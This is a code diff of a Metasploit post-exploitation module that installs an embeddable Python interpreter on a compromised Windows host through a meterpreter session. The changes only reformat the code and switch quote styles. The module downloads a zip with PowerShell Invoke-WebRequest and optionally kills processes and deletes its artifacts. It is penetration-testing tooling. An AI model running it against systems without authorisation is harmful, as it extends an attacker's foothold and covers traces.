@@ -9,23 +9,27 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Powershell
 
   def initialize(info = {})
-    super(update_info(info,
-                      'Name'          => 'Install Python for Windows',
-                      'Description'   => '
-                        This module places an embeddable Python3 distribution onto the target file system,
-                        granting pentesters access to a lightweight Python interpreter.
-                        This module does not require administrative privileges or user interaction with
-                        installation prompts.
-                      ',
-                      'License'       => MSF_LICENSE,
-                      'Author'        => ['Michael Long <bluesentinel[at]protonmail.com>'],
-                      'Arch' => [ARCH_X86, ARCH_X64],
-                      'Platform'      => [ 'win' ],
-                      'SessionTypes'  => [ 'meterpreter'],
-                      'References'	=> [
-                        ['URL', 'https://docs.python.org/3/using/windows.html#windows-embeddable'],
-                        ['URL', 'https://attack.mitre.org/techniques/T1064/']
-                      ]))
+    super(
+      update_info(
+        info,
+        'Name' => 'Install Python for Windows',
+        'Description' => %q{
+          This module places an embeddable Python3 distribution onto the target file system,
+          granting pentesters access to a lightweight Python interpreter.
+          This module does not require administrative privileges or user interaction with
+          installation prompts.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['Michael Long <bluesentinel[at]protonmail.com>'],
+        'Arch' => [ARCH_X86, ARCH_X64],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter'],
+        'References'	=> [
+          ['URL', 'https://docs.python.org/3/using/windows.html#windows-embeddable'],
+          ['URL', 'https://attack.mitre.org/techniques/T1064/']
+        ]
+      )
+    )
     register_options(
       [
         OptString.new('PYTHON_VERSION', [true, 'Python version to download', '3.8.2']),
@@ -38,19 +42,19 @@ class MetasploitModule < Msf::Post
 
   def run
     python_folder_path = File.basename(datastore['FILE_PATH'], File.extname(datastore['FILE_PATH']))
-    python_exe_path = python_folder_path + "\\python.exe"
-    python_url = datastore['PYTHON_URL'] + datastore['PYTHON_VERSION'] + "/python-" + datastore['PYTHON_VERSION'] + "-embed-win32.zip"
+    python_exe_path = python_folder_path + '\\python.exe'
+    python_url = datastore['PYTHON_URL'] + datastore['PYTHON_VERSION'] + '/python-' + datastore['PYTHON_VERSION'] + '-embed-win32.zip'
 
     # check if PowerShell is available
-    psh_path = "\\WindowsPowerShell\\v1.0\\powershell.exe"
+    psh_path = '\\WindowsPowerShell\\v1.0\\powershell.exe'
     unless file? "%WINDIR%\\System32#{psh_path}"
-      fail_with(Failure::NotVulnerable, "No powershell available.")
+      fail_with(Failure::NotVulnerable, 'No powershell available.')
     end
 
     # Cleanup module artifacts
     if datastore['CLEANUP']
-      print_status("Removing module artifacts")
-      script = "Stop-Process -Name \"python\" -Force; "
+      print_status('Removing module artifacts')
+      script = 'Stop-Process -Name "python" -Force; '
       script << "Remove-Item -Force #{datastore['FILE_PATH']}; "
       script << "Remove-Item -Force -Recurse #{python_folder_path}; "
       psh_exec(script)
@@ -58,7 +62,7 @@ class MetasploitModule < Msf::Post
     end
 
     # download python embeddable zip file
-    script = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;"
+    script = '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;'
     script << "Invoke-WebRequest -Uri #{python_url} -OutFile #{datastore['FILE_PATH']}; "
     print_status("Downloading Python embeddable zip from #{python_url}")
     psh_exec(script)
@@ -79,8 +83,8 @@ class MetasploitModule < Msf::Post
     end
 
     # display location of python interpreter with example command
-    print_status("Ready to execute Python; spawn a command shell and enter:")
+    print_status('Ready to execute Python; spawn a command shell and enter:')
     print_good("#{python_exe_path} -c \"print('Hello, world!')\"")
-    print_warning("Avoid using this python.exe interactively, as it will likely hang your terminal; use script files or 1 liners instead")
+    print_warning('Avoid using this python.exe interactively, as it will likely hang your terminal; use script files or 1 liners instead')
   end
 end
